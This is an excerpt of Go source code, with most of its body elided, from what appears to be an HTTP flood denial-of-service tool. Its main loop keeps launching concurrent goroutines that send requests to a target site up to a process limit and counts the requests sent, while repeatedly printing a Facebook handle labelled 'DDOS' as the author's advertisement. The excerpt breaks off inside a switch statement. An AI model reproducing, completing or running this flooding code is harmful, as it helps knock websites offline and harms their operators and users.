...
func main() {
	...
	if err != nil {
		fmt.Println("https://www.facebook.com/DONGUYENDUYKHUONG.X.DDOS")
		os.Exit(1)
	}
	...
	go func() {
		...
		fmt.Println("Add FB: https://www.facebook.com/DONGUYENDUYKHUONG.X.DDOS")
		for {
			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
				go httpcall(site, u.Host, data, headers, ss)
			}
			if sent%10 == 0 {
				fmt.Printf("https://www.facebook.com/DONGUYENDUYKHUONG.X.DDOS", cur, maxproc, sent, err)
			}
			switch <-ss {
			case callExitOnErr:
